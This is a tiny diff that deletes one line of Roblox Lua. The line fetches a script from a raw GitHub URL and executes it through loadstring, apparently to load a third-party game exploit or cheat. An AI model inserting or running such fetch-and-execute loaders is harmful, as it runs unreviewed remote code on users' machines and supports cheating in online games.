@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Nuker1234/Scripts/main/Initial%20D%20ick"))()
